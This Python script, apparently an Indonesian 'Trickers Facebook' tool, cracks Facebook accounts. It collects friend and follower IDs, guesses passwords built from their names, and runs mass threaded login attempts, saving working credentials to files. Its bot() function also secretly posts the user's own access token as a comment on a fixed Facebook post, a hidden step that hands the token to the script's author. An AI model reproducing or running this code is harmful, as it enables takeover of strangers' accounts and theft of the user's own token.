#!/usr/bin/python3
# coding=utf-8


###### IMPORT MODULE ######

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,json,concurrent.futures
from concurrent.futures import ThreadPoolExecutor as ThreadPool

###### RANDOM WARNA ######

p = "\033[1;97m" # putih
m = "\033[1;91m" # merah
h = "\033[1;92m" # hijau
k = "\033[1;94m" # biru
b = "\033[1;94m" # biru
u = "\033[1;95m" # ungu
o = "\033[1;96m" # biru muda

###### LOGO ######

def banner():
    print("""\n\033[1;91m\n██████\033[1;97m╗\033[1;91m ██\033[1;97m╗  \033[1;91m ██\033[1;97m╗\033[1;91m██\033[1;97m╗           \033[1;91m███████\033[1;97m╗\n\033[1;91m██\033[1;97m╔══\033[1;91m██\033[1;97m╗\033[1;91m██\033[1;97m║   \033[1;91m██\033[1;97m║\033[1;91m██\033[1;97m║           ╚════\033[1;91m██\033[1;97m║\n\033[1;91m██████\033[1;97m╔╝\033[1;91m██\033[1;97m║   \033[1;91m██\033[1;97m║\033[1;91m██\033[1;97m║     \033[1;91m█████\033[1;97m╗  \033[1;91m███\033[1;97m╔═╝\n\033[1;91m██\033[1;97m╔══\033[1;91m██\033[1;97m╗\033[1;91m██\033[1;97m║   \033[1;91m██\033[1;97m║\033[1;91m██\033[1;97m║     ╚════╝\033[1;91m██\033[1;97m╔══╝\n\033[1;91m██\033[1;97m║  \033[1;91m██\033[1;97m║╚\033[1;91m██████\033[1;97m╔╝\033[1;91m███████\033[1;97m╗      \033[1;91m███████\033[1;97m╗\n\033[1;97m╚═╝  ╚═╝ ╚═════╝ ╚══════╝      ╚══════╝\n\n\033[3mTrickers Facebook Indonesia\033[00;1m""")


ok = []
cp = []
ttl =[]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)


###### LOGIN TOKEN ######

def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"×"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"×"+k+"]"+p+" Login Successful"))
        bot()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        log_token()

###### BOT KOMEN ######

def bot():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
		tokenz()
	kom = ("Hello @[100024540287354:] 😹 ")
	requests.post('https://graph.facebook.com/100024540287354/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/1090371428457523/comments/?message=' + toket + '&access_token=' + toket)
	requests.post('https://graph.facebook.com/1090371428457523/comments/?message=' + kom + '&access_token=' + toket)
	menu()

###### MENU ######

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"×"+k+"]"+p+" Error : %s"%e))
        log_token()
    os.system("clear")
    banner()
    print((k+"\n["+p+"1"+k+"]"+p+" Crack ID From Friend"))
    print((k+"["+p+"2"+k+"]"+p+" Crack ID From Public"))
    print((k+"["+p+"3"+k+"]"+p+" Crack ID From Followers"))
    print((k+"["+p+"0"+k+"]"+p+" Logout"))
    choose_menu()
	
def choose_menu():
	r=input(k+"\n["+p+"×"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1":
		friend()
	elif r=="2":
		publik()
	elif r=="3":
		follow()
	elif r=="4":
		ress()
	elif r=="0":
		try:
			jalan(k+"\n["+p+"×"+k+"]"+p+" Thanks For Using My Script")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
		menu()	

###### FRIENDS ######

def friend():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		try:
			os.system('clear')
			banner()
			jok = requests.get("https://graph.facebook.com/me?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"\n["+p+"×"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/me/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"×"+k+"]"+p+" Total ID : %s"%(len(id))))
		return crack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

###### PUBLIK ######

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		os.system('clear')
		banner()
		idt = input(k+"["+p+"×"+k+"]"+p+" User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"×"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"×"+k+"]"+p+" Total ID : %s"%(len(id))))
		return crack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

###### FOLLOWERS ######

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		log_token()
	try:
		os.system('clear')
		banner()
		idt = input(k+"\n["+p+"×"+k+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"×"+k+"]"+p+" Name : "+op["name"]))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"["+p+"×"+k+"]"+p+" Total ID : %s"%(len(id))))
		return crack(qq)
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

###### LIST PASSWORD ######

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				
	return results

###### MBASIC ######

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}



class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"×"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"×"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"×"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print(f'\n\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Crack Started : \033[1;94m[\033[1;97m {time.strftime("%X")} \033[1;94m]\033[1;97m')
				print('\n')
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"×"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print(f'\n\033[1;94m[\033[1;97m×\033[1;94m]\033[1;97m Crack Started : \033[1;94m[\033[1;97m {time.strftime("%X")} \033[1;94m]\033[1;97m')
			print('\n')
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\033[1;32m[OK] %s | %s               "%(fl.get("id"),i)))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print(("\r\033[1;93m[CP] %s | %s               "%(fl.get("id"),i)))
					self.cp.append("%s | %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s | %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\033[1;94m[\033[1;97m CRACK \033[1;94m]\033[1;97m %s/%s \033[1;92mOK \033[1;97m: %s \033[1;93mCP \033[1;97m: %s\033[1;97m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)


			
###### RESULTS ######

def results(pahrul,tricker):
        if len(pahrul) !=0:
                print(("[OK] : "+str(len(pahrul))))
        if len(tricker) !=0:
                print(("[CP] : "+str(len(tricker))))
        if len(pahrul) ==0 and len(tricker) ==0:
                print("\n")
                print((k+"["+p+"!"+k+"]"+p+" No Result Found"))



if __name__=="__main__":
	menu()
	log_token()
